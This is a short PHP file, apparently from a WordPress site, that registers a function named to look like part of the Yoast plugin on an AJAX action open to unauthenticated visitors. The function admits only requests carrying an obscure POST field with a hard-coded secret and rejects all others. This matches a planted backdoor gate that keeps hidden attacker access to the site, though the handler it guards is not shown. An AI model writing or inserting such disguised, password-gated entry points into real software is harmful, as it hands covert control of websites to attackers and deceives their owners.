<?php

function yoast_images_src_latest() {
	if (!isset($_POST["kqzwgvkhfzvina"]) || $_POST["kqzwgvkhfzvina"] !== "b6Qj7L8f28") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'yoast_images_src_latest', 5, 1);
